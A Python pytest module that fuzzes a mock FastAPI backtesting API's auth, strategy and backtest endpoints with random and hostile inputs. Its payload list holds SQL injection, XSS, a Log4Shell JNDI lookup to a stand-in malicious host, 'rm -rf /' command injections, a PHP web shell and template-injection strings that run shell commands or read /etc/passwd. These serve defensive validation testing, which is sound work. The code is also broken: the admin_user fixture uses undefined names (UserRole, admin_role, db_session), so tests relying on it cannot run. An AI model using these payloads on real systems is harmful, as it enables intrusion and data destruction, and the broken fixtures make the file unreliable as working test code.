"""
API fuzzing tests for the USDC arbitrage backtesting application.

This module focuses on comprehensive fuzzing of API inputs to identify potential
vulnerabilities and edge cases in input validation.
"""

import json
import random
import string
import time
from datetime import datetime, timedelta
from typing import Any, Dict, List, Optional, Union
from unittest.mock import MagicMock

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker


# Mock the necessary components to avoid circular imports
class MockSecurityService:
    """Mock security service for testing."""

    def __init__(self, db=None):
        self.db = db

    def create_user(self, username, email, password):
        """Mock user creation."""
        user = MagicMock()
        user.id = random.randint(1, 1000)
        user.username = username
        user.email = email
        user.password_hash = f"hashed_{password}"
        user.is_active = True
        return user

    def get_password_hash(self, password):
        """Mock password hashing."""
        return f"hashed_{password}"

    def verify_password(self, plain_password, hashed_password):
        """Mock password verification."""
        return hashed_password == f"hashed_{plain_password}"

    def create_access_token(self, data, expires_delta=None):
        """Mock token creation."""
        return f"mock_token_{data.get('user_id', 0)}"

    def verify_token(self, token, token_type="access"):
        """Mock token verification."""
        if token.startswith("mock_token_"):
            user_id = int(token.split("_")[-1])
            return {"sub": f"user_{user_id}", "user_id": user_id, "type": token_type}
        raise Exception("Invalid token")

    def get_user_permissions(self, user_id):
        """Mock permission retrieval."""
        if user_id == 1:  # Admin
            return ["manage:system", "manage:users", "manage:roles", "manage:api_keys"]
        return ["read:own_data", "create:backtest", "read:strategies"]


# Create a simple FastAPI app for testing
app = FastAPI()


# Add basic routes for testing
from pydantic import BaseModel


class UserCreate(BaseModel):
    username: str
    email: str
    password: str


@app.post("/auth/register", status_code=201)
async def register(user: UserCreate):
    if not user.username or not user.email or not user.password:
        return {"error": "Missing required fields"}, 400
    return {"username": user.username, "email": user.email, "is_active": True}


class LoginForm(BaseModel):
    username: str = None
    password: str = None


@app.post("/auth/login")
async def login(form_data: LoginForm = None):
    if (
        form_data
        and form_data.username == "admin"
        and form_data.password == "password123"
    ):
        return {
            "access_token": "mock_token",
            "refresh_token": "mock_refresh_token",
            "token_type": "bearer",
            "expires_in": 1800,
        }
    return {"error": "Invalid credentials"}


class RefreshRequest(BaseModel):
    refresh_token: str


@app.post("/auth/refresh")
async def refresh_token(request: RefreshRequest = None):
    if request and request.refresh_token == "valid_token":
        return {
            "access_token": "new_mock_token",
            "refresh_token": "new_mock_refresh_token",
        }
    return {"error": "Invalid refresh token"}


class StrategyCreate(BaseModel):
    name: str = None
    description: str = None
    code: str = None
    parameters: dict = None


@app.post("/strategies/", status_code=201)
async def create_strategy(strategy: StrategyCreate = None):
    if not strategy or not strategy.name:
        return {"error": "Name is required"}
    return {"id": 1, "name": strategy.name, "description": strategy.description}


class StrategyUpdate(BaseModel):
    name: str = None
    description: str = None
    code: str = None
    parameters: dict = None


@app.put("/strategies/{strategy_id}")
async def update_strategy(strategy_id: int, strategy: StrategyUpdate = None):
    return {
        "id": strategy_id,
        "name": strategy.name if strategy and strategy.name else "Updated Strategy",
        "description": strategy.description if strategy else None,
    }


class BacktestCreate(BaseModel):
    strategy_id: int = None
    start_date: str = None
    end_date: str = None
    initial_balance: float = None


@app.post("/backtest/")
async def create_backtest(backtest: BacktestCreate = None):
    if (
        not backtest
        or not backtest.strategy_id
        or not backtest.start_date
        or not backtest.end_date
        or backtest.initial_balance is None
    ):
        return {"error": "Missing required fields"}
    return {
        "id": 1,
        "strategy_id": backtest.strategy_id,
        "start_date": backtest.start_date,
        "end_date": backtest.end_date,
    }


@app.get("/health")
async def health_check():
    return {"status": "ok"}


# Mock database setup
SQLALCHEMY_DATABASE_URL = "sqlite:///./test_api_fuzzing.db"
engine = create_engine(
    SQLALCHEMY_DATABASE_URL, connect_args={"check_same_thread": False}
)
TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)


# Mock models
class Base:
    metadata = MagicMock()


class Role:
    def __init__(self, name, description, permissions):
        self.id = random.randint(1, 1000)
        self.name = name
        self.description = description
        self.permissions = permissions


class User:
    def __init__(self, username, email, password_hash):
        self.id = random.randint(1, 1000)
        self.username = username
        self.email = email
        self.password_hash = password_hash
        self.is_active = True
        self.last_login = datetime.now()


# Test database setup
SQLALCHEMY_DATABASE_URL = "sqlite:///./test_api_fuzzing.db"
engine = create_engine(
    SQLALCHEMY_DATABASE_URL, connect_args={"check_same_thread": False}
)
TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)


def override_get_db():
    """Override database dependency for testing."""
    db = MagicMock()
    yield db


@pytest.fixture(scope="module")
def setup_database():
    """Set up test database."""
    yield


@pytest.fixture
def db_session():
    """Create a database session for testing."""
    db = MagicMock()
    yield db


@pytest.fixture
def client():
    """Create a test client."""
    return TestClient(app)


@pytest.fixture
def security_service():
    """Create a security service instance."""
    return MockSecurityService()


@pytest.fixture
def admin_user(security_service):
    """Create an admin user for testing."""
    # Create admin user
    user = security_service.create_user(
        "admin_fuzzing", "admin_fuzzing@test.com", "password123"
    )
    user.id = 1  # Set ID to 1 for admin

    # Assign admin role
    user_role = UserRole(user_id=user.id, role_id=admin_role.id)
    db_session.add(user_role)
    db_session.commit()

    return user


@pytest.fixture
def admin_token(admin_user, security_service):
    """Create an admin access token."""
    token_data = {
        "sub": admin_user.username,
        "user_id": admin_user.id,
        "permissions": security_service.get_user_permissions(admin_user.id),
    }
    return security_service.create_access_token(token_data)


# Helper functions for generating random data
def random_string(min_length=1, max_length=100):
    """Generate a random string."""
    length = random.randint(min_length, max_length)
    return "".join(random.choice(string.printable) for _ in range(length))


def random_email():
    """Generate a random email address."""
    username = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
    domain = "".join(random.choice(string.ascii_lowercase) for _ in range(5))
    tld = random.choice(["com", "org", "net", "io", "co"])
    return f"{username}@{domain}.{tld}"


def random_date_string():
    """Generate a random date string."""
    year = random.randint(1900, 2100)
    month = random.randint(1, 12)
    day = random.randint(1, 28)  # Avoid month boundary issues
    hour = random.randint(0, 23)
    minute = random.randint(0, 59)
    second = random.randint(0, 59)

    return f"{year}-{month:02d}-{day:02d}T{hour:02d}:{minute:02d}:{second:02d}"


def random_number(min_val=-1000000, max_val=1000000):
    """Generate a random number."""
    return random.uniform(min_val, max_val)


def random_boolean():
    """Generate a random boolean."""
    return random.choice([True, False])


def random_object(depth=0, max_depth=3):
    """Generate a random nested object."""
    if depth >= max_depth:
        return random_string()

    obj = {}
    for _ in range(random.randint(1, 5)):
        key = random_string(1, 10)
        value_type = random.choice(["string", "number", "boolean", "object", "array"])

        if value_type == "string":
            obj[key] = random_string()
        elif value_type == "number":
            obj[key] = random_number()
        elif value_type == "boolean":
            obj[key] = random_boolean()
        elif value_type == "object" and depth < max_depth:
            obj[key] = random_object(depth + 1, max_depth)
        elif value_type == "array" and depth < max_depth:
            obj[key] = [
                random_object(depth + 1, max_depth) for _ in range(random.randint(1, 3))
            ]
        else:
            obj[key] = random_string()

    return obj


def random_array(min_length=0, max_length=10, depth=0, max_depth=3):
    """Generate a random array."""
    length = random.randint(min_length, max_length)
    return [random_object(depth, max_depth) for _ in range(length)]


def generate_malicious_strings():
    """Generate strings that might cause security issues."""
    return [
        "<script>alert('XSS')</script>",
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "${jndi:ldap://malicious-server.com/exploit}",
        "../../../../../../etc/passwd",
        "$(rm -rf /)",
        "`rm -rf /`",
        "{{7*7}}",
        "' UNION SELECT username, password FROM users; --",
        "%00",  # Null byte
        "../../../boot.ini",
        "<?php echo shell_exec($_GET['cmd']); ?>",
        "{{config.items()}}",
        "' OR 1=1 /*",
        "'; exec master..xp_cmdshell 'net user'; --",
        "/**/OR/**/1=1",
        "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'--",
        "' AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
        "AND (SELECT 6765 FROM (SELECT(SLEEP(5)))OQkd)",
        "'; WAITFOR DELAY '0:0:5'--",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "eval(compile('for x in range(1):\\n import os\\n os.system(\"touch /tmp/pwnd\")','a','single'))",
        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
    ]


class TestAuthFuzzing:
    """Test authentication endpoints with fuzzing."""

    def test_login_fuzzing(self, client):
        """Test login endpoint with fuzzed inputs."""
        # Generate a variety of inputs
        test_cases = []

        # Normal cases with variations
        test_cases.extend([
            {"username": "admin", "password": "password123"},
            {"username": "admin", "password": ""},
            {"username": "", "password": "password123"},
        ])

        # Random strings
        for _ in range(10):
            test_cases.append({
                "username": random_string(),
                "password": random_string(),
            })

        # Type variations
        test_cases.extend([
            {"username": 12345, "password": "password123"},
            {"username": "admin", "password": 12345},
            {"username": True, "password": "password123"},
            {"username": "admin", "password": False},
            {"username": None, "password": "password123"},
            {"username": "admin", "password": None},
            {"username": ["admin"], "password": "password123"},
            {"username": "admin", "password": ["password123"]},
            {"username": {"name": "admin"}, "password": "password123"},
            {"username": "admin", "password": {"value": "password123"}},
        ])

        # Malicious strings
        for malicious in generate_malicious_strings():
            test_cases.append({"username": malicious, "password": "password123"})
            test_cases.append({"username": "admin", "password": malicious})

        # Extra fields
        test_cases.extend([
            {"username": "admin", "password": "password123", "extra": "field"},
            {"username": "admin", "password": "password123", "token": "fake_token"},
            {"username": "admin", "password": "password123", "admin": True},
        ])

        # Test all cases
        for i, test_case in enumerate(test_cases):
            try:
                response = client.post("/auth/login", data=test_case)
                # Should not crash the server
                assert response.status_code in [200, 400, 401, 422]
            except Exception as e:
                pytest.fail(f"Login fuzzing case {i} caused exception: {e}")

    def test_register_fuzzing(self, client):
        """Test registration endpoint with fuzzed inputs."""
        # Generate a variety of inputs
        test_cases = []

        # Normal cases with variations
        test_cases.extend([
            {
                "username": "newuser",
                "email": "new@example.com",
                "password": "password123",
            },
            {"username": "", "email": "new@example.com", "password": "password123"},
            {"username": "newuser", "email": "", "password": "password123"},
            {"username": "newuser", "email": "new@example.com", "password": ""},
        ])

        # Random strings
        for _ in range(10):
            test_cases.append({
                "username": random_string(),
                "email": random_email(),
                "password": random_string(),
            })

        # Type variations
        test_cases.extend([
            {"username": 12345, "email": "new@example.com", "password": "password123"},
            {"username": "newuser", "email": 12345, "password": "password123"},
            {"username": "newuser", "email": "new@example.com", "password": 12345},
            {"username": True, "email": "new@example.com", "password": "password123"},
            {"username": "newuser", "email": False, "password": "password123"},
            {"username": "newuser", "email": "new@example.com", "password": True},
            {"username": None, "email": "new@example.com", "password": "password123"},
            {"username": "newuser", "email": None, "password": "password123"},
            {"username": "newuser", "email": "new@example.com", "password": None},
            {
                "username": ["newuser"],
                "email": "new@example.com",
                "password": "password123",
            },
            {
                "username": "newuser",
                "email": ["new@example.com"],
                "password": "password123",
            },
            {
                "username": "newuser",
                "email": "new@example.com",
                "password": ["password123"],
            },
        ])

        # Malicious strings
        for malicious in generate_malicious_strings():
            test_cases.append({
                "username": malicious,
                "email": "new@example.com",
                "password": "password123",
            })
            test_cases.append({
                "username": "newuser",
                "email": malicious,
                "password": "password123",
            })
            test_cases.append({
                "username": "newuser",
                "email": "new@example.com",
                "password": malicious,
            })

        # Extra fields
        test_cases.extend([
            {
                "username": "newuser",
                "email": "new@example.com",
                "password": "password123",
                "extra": "field",
            },
            {
                "username": "newuser",
                "email": "new@example.com",
                "password": "password123",
                "admin": True,
            },
            {
                "username": "newuser",
                "email": "new@example.com",
                "password": "password123",
                "role": "admin",
            },
        ])

        # Test all cases
        for i, test_case in enumerate(test_cases):
            try:
                response = client.post("/auth/register", json=test_case)
                # Should not crash the server
                assert response.status_code in [201, 400, 401, 422]
            except Exception as e:
                pytest.fail(f"Register fuzzing case {i} caused exception: {e}")

    def test_token_refresh_fuzzing(self, client):
        """Test token refresh endpoint with fuzzed inputs."""
        # Generate a variety of inputs
        test_cases = []

        # Normal case
        test_cases.append({"refresh_token": "valid_token"})

        # Variations
        test_cases.extend([
            {"refresh_token": ""},
            {},
            {"token": "valid_token"},  # Wrong field name
            {"refresh_token": None},
            {"refresh_token": 12345},
            {"refresh_token": True},
            {"refresh_token": ["valid_token"]},
            {"refresh_token": {"token": "valid_token"}},
        ])

        # Malicious strings
        for malicious in generate_malicious_strings():
            test_cases.append({"refresh_token": malicious})

        # Extra fields
        test_cases.extend([
            {"refresh_token": "valid_token", "extra": "field"},
            {"refresh_token": "valid_token", "access_token": "another_token"},
        ])

        # Test all cases
        for i, test_case in enumerate(test_cases):
            try:
                response = client.post("/auth/refresh", json=test_case)
                # Should not crash the server
                assert response.status_code in [200, 400, 401, 422]
            except Exception as e:
                pytest.fail(f"Token refresh fuzzing case {i} caused exception: {e}")


class TestStrategyFuzzing:
    """Test strategy endpoints with fuzzing."""

    def test_create_strategy_fuzzing(self, client, admin_token):
        """Test strategy creation endpoint with fuzzed inputs."""
        headers = {"Authorization": f"Bearer {admin_token}"}

        # Generate a variety of inputs
        test_cases = []

        # Normal case
        test_cases.append({
            "name": "Test Strategy",
            "description": "A test strategy",
            "code": "def strategy(data): return {'action': 'hold'}",
            "parameters": {"param1": "value1"},
        })

        # Field variations
        test_cases.extend([
            # Empty fields
            {
                "name": "",
                "description": "A test strategy",
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {"param1": "value1"},
            },
            {
                "name": "Test Strategy",
                "description": "",
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {"param1": "value1"},
            },
            {
                "name": "Test Strategy",
                "description": "A test strategy",
                "code": "",
                "parameters": {"param1": "value1"},
            },
            {
                "name": "Test Strategy",
                "description": "A test strategy",
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {},
            },
            # Missing fields
            {
                "description": "A test strategy",
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {"param1": "value1"},
            },
            {
                "name": "Test Strategy",
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {"param1": "value1"},
            },
            {
                "name": "Test Strategy",
                "description": "A test strategy",
                "parameters": {"param1": "value1"},
            },
            {
                "name": "Test Strategy",
                "description": "A test strategy",
                "code": "def strategy(data): return {'action': 'hold'}",
            },
            # Type variations
            {
                "name": 12345,
                "description": "A test strategy",
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {"param1": "value1"},
            },
            {
                "name": "Test Strategy",
                "description": 12345,
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {"param1": "value1"},
            },
            {
                "name": "Test Strategy",
                "description": "A test strategy",
                "code": 12345,
                "parameters": {"param1": "value1"},
            },
            {
                "name": "Test Strategy",
                "description": "A test strategy",
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": "not_a_dict",
            },
            {
                "name": True,
                "description": False,
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {"param1": "value1"},
            },
            {
                "name": ["Test Strategy"],
                "description": "A test strategy",
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {"param1": "value1"},
            },
            {
                "name": "Test Strategy",
                "description": ["A test strategy"],
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {"param1": "value1"},
            },
            {
                "name": "Test Strategy",
                "description": "A test strategy",
                "code": ["def strategy(data): return {'action': 'hold'}"],
                "parameters": {"param1": "value1"},
            },
            {
                "name": "Test Strategy",
                "description": "A test strategy",
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": ["param1", "value1"],
            },
        ])

        # Random data
        for _ in range(10):
            test_cases.append({
                "name": random_string(),
                "description": random_string(0, 500),
                "code": f"def strategy(data): return {{'action': '{random.choice(['buy', 'sell', 'hold'])}', 'amount': {random.random()}}}",
                "parameters": random_object(),
            })

        # Malicious strings
        for malicious in generate_malicious_strings():
            test_cases.append({
                "name": malicious,
                "description": "A test strategy",
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {"param1": "value1"},
            })
            test_cases.append({
                "name": "Test Strategy",
                "description": malicious,
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {"param1": "value1"},
            })
            test_cases.append({
                "name": "Test Strategy",
                "description": "A test strategy",
                "code": malicious,
                "parameters": {"param1": "value1"},
            })
            test_cases.append({
                "name": "Test Strategy",
                "description": "A test strategy",
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {"param1": malicious},
            })

        # Extra fields
        test_cases.extend([
            {
                "name": "Test Strategy",
                "description": "A test strategy",
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {"param1": "value1"},
                "extra": "field",
            },
            {
                "name": "Test Strategy",
                "description": "A test strategy",
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {"param1": "value1"},
                "id": 12345,
            },
            {
                "name": "Test Strategy",
                "description": "A test strategy",
                "code": "def strategy(data): return {'action': 'hold'}",
                "parameters": {"param1": "value1"},
                "user_id": 1,
            },
        ])

        # Test all cases
        for i, test_case in enumerate(test_cases):
            try:
                response = client.post("/strategies/", json=test_case, headers=headers)
                # Should not crash the server
                assert response.status_code in [200, 201, 400, 422]
            except Exception as e:
                pytest.fail(f"Create strategy fuzzing case {i} caused exception: {e}")

    def test_update_strategy_fuzzing(self, client, admin_token):
        """Test strategy update endpoint with fuzzed inputs."""
        headers = {"Authorization": f"Bearer {admin_token}"}

        # First create a strategy to update
        strategy_data = {
            "name": "Strategy to Update",
            "description": "A strategy for update testing",
            "code": "def strategy(data): return {'action': 'hold'}",
            "parameters": {"param1": "value1"},
        }

        create_response = client.post(
            "/strategies/", json=strategy_data, headers=headers
        )

        if create_response.status_code in [200, 201]:
            strategy_id = create_response.json().get("id", 1)

            # Generate a variety of inputs for updates
            test_cases = []

            # Normal case
            test_cases.append({
                "name": "Updated Strategy",
                "description": "An updated strategy",
                "code": "def strategy(data): return {'action': 'buy'}",
                "parameters": {"param1": "updated_value"},
            })

            # Partial updates
            test_cases.extend([
                {"name": "Updated Name Only"},
                {"description": "Updated Description Only"},
                {"code": "def strategy(data): return {'action': 'sell'}"},
                {"parameters": {"updated": "parameter"}},
            ])

            # Type variations
            test_cases.extend([
                {"name": 12345},
                {"description": 12345},
                {"code": 12345},
                {"parameters": "not_a_dict"},
                {"name": True},
                {"description": False},
                {"code": None},
                {"parameters": ["param1", "value1"]},
            ])

            # Random data
            for _ in range(5):
                test_cases.append({
                    "name": random_string(),
                    "description": random_string(0, 500),
                    "code": f"def strategy(data): return {{'action': '{random.choice(['buy', 'sell', 'hold'])}', 'amount': {random.random()}}}",
                    "parameters": random_object(),
                })

            # Malicious strings
            for malicious in generate_malicious_strings()[:5]:  # Limit to 5 for brevity
                test_cases.append({"name": malicious})
                test_cases.append({"description": malicious})
                test_cases.append({"code": malicious})
                test_cases.append({"parameters": {"param1": malicious}})

            # Extra fields
            test_cases.extend([
                {"name": "Extra Fields", "extra": "field"},
                {"name": "ID Field", "id": 99999},
                {"name": "User ID Field", "user_id": 99999},
            ])

            # Test all cases
            for i, test_case in enumerate(test_cases):
                try:
                    response = client.put(
                        f"/strategies/{strategy_id}", json=test_case, headers=headers
                    )
                    # Should not crash the server
                    assert response.status_code in [200, 400, 404, 422]
                except Exception as e:
                    pytest.fail(
                        f"Update strategy fuzzing case {i} caused exception: {e}"
                    )


class TestBacktestFuzzing:
    """Test backtest endpoints with fuzzing."""

    def test_create_backtest_fuzzing(self, client, admin_token):
        """Test backtest creation endpoint with fuzzed inputs."""
        headers = {"Authorization": f"Bearer {admin_token}"}

        # First create a strategy for backtesting
        strategy_data = {
            "name": "Backtest Strategy",
            "description": "A strategy for backtest fuzzing",
            "code": "def strategy(data): return {'action': 'hold'}",
            "parameters": {},
        }

        create_response = client.post(
            "/strategies/", json=strategy_data, headers=headers
        )

        if create_response.status_code in [200, 201]:
            strategy_id = create_response.json().get("id", 1)

            # Generate a variety of inputs
            test_cases = []

            # Normal case
            test_cases.append({
                "strategy_id": strategy_id,
                "start_date": "2023-01-01T00:00:00",
                "end_date": "2023-01-31T00:00:00",
                "initial_balance": 10000.0,
            })

            # Field variations
            test_cases.extend([
                # Missing fields
                {
                    "start_date": "2023-01-01T00:00:00",
                    "end_date": "2023-01-31T00:00:00",
                    "initial_balance": 10000.0,
                },
                {
                    "strategy_id": strategy_id,
                    "end_date": "2023-01-31T00:00:00",
                    "initial_balance": 10000.0,
                },
                {
                    "strategy_id": strategy_id,
                    "start_date": "2023-01-01T00:00:00",
                    "initial_balance": 10000.0,
                },
                {
                    "strategy_id": strategy_id,
                    "start_date": "2023-01-01T00:00:00",
                    "end_date": "2023-01-31T00:00:00",
                },
                # Type variations
                {
                    "strategy_id": "not_a_number",
                    "start_date": "2023-01-01T00:00:00",
                    "end_date": "2023-01-31T00:00:00",
                    "initial_balance": 10000.0,
                },
                {
                    "strategy_id": strategy_id,
                    "start_date": 12345,
                    "end_date": "2023-01-31T00:00:00",
                    "initial_balance": 10000.0,
                },
                {
                    "strategy_id": strategy_id,
                    "start_date": "2023-01-01T00:00:00",
                    "end_date": 12345,
                    "initial_balance": 10000.0,
                },
                {
                    "strategy_id": strategy_id,
                    "start_date": "2023-01-01T00:00:00",
                    "end_date": "2023-01-31T00:00:00",
                    "initial_balance": "not_a_number",
                },
                {
                    "strategy_id": True,
                    "start_date": False,
                    "end_date": None,
                    "initial_balance": "10000.0",
                },
            ])

            # Date edge cases
            test_cases.extend([
                # Invalid dates
                {
                    "strategy_id": strategy_id,
                    "start_date": "not-a-date",
                    "end_date": "2023-01-31T00:00:00",
                    "initial_balance": 10000.0,
                },
                {
                    "strategy_id": strategy_id,
                    "start_date": "2023-01-01T00:00:00",
                    "end_date": "not-a-date",
                    "initial_balance": 10000.0,
                },
                # End date before start date
                {
                    "strategy_id": strategy_id,
                    "start_date": "2023-01-31T00:00:00",
                    "end_date": "2023-01-01T00:00:00",
                    "initial_balance": 10000.0,
                },
                # Same start and end date
                {
                    "strategy_id": strategy_id,
                    "start_date": "2023-01-01T00:00:00",
                    "end_date": "2023-01-01T00:00:00",
                    "initial_balance": 10000.0,
                },
                # Very old date
                {
                    "strategy_id": strategy_id,
                    "start_date": "1900-01-01T00:00:00",
                    "end_date": "1900-01-31T00:00:00",
                    "initial_balance": 10000.0,
                },
                # Future date
                {
                    "strategy_id": strategy_id,
                    "start_date": "2050-01-01T00:00:00",
                    "end_date": "2050-01-31T00:00:00",
                    "initial_balance": 10000.0,
                },
            ])

            # Numeric edge cases
            test_cases.extend([
                # Zero balance
                {
                    "strategy_id": strategy_id,
                    "start_date": "2023-01-01T00:00:00",
                    "end_date": "2023-01-31T00:00:00",
                    "initial_balance": 0.0,
                },
                # Negative balance
                {
                    "strategy_id": strategy_id,
                    "start_date": "2023-01-01T00:00:00",
                    "end_date": "2023-01-31T00:00:00",
                    "initial_balance": -1000.0,
                },
                # Very large balance
                {
                    "strategy_id": strategy_id,
                    "start_date": "2023-01-01T00:00:00",
                    "end_date": "2023-01-31T00:00:00",
                    "initial_balance": 1e20,
                },
                # Very small balance
                {
                    "strategy_id": strategy_id,
                    "start_date": "2023-01-01T00:00:00",
                    "end_date": "2023-01-31T00:00:00",
                    "initial_balance": 1e-10,
                },
            ])

            # Random data
            for _ in range(5):
                test_cases.append({
                    "strategy_id": random.choice([
                        strategy_id,
                        random.randint(1, 1000),
                    ]),
                    "start_date": random_date_string(),
                    "end_date": random_date_string(),
                    "initial_balance": random_number(0, 1000000),
                })

            # Malicious strings
            for malicious in generate_malicious_strings()[:3]:  # Limit to 3 for brevity
                test_cases.append({
                    "strategy_id": strategy_id,
                    "start_date": malicious,
                    "end_date": "2023-01-31T00:00:00",
                    "initial_balance": 10000.0,
                })
                test_cases.append({
                    "strategy_id": strategy_id,
                    "start_date": "2023-01-01T00:00:00",
                    "end_date": malicious,
                    "initial_balance": 10000.0,
                })

            # Extra fields
            test_cases.extend([
                {
                    "strategy_id": strategy_id,
                    "start_date": "2023-01-01T00:00:00",
                    "end_date": "2023-01-31T00:00:00",
                    "initial_balance": 10000.0,
                    "extra": "field",
                },
                {
                    "strategy_id": strategy_id,
                    "start_date": "2023-01-01T00:00:00",
                    "end_date": "2023-01-31T00:00:00",
                    "initial_balance": 10000.0,
                    "id": 12345,
                },
            ])

            # Test all cases
            for i, test_case in enumerate(test_cases):
                try:
                    response = client.post(
                        "/backtest/", json=test_case, headers=headers
                    )
                    # Should not crash the server
                    assert response.status_code in [200, 400, 404, 422, 500]
                except Exception as e:
                    pytest.fail(
                        f"Create backtest fuzzing case {i} caused exception: {e}"
                    )


# Removed Hypothesis-based tests


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
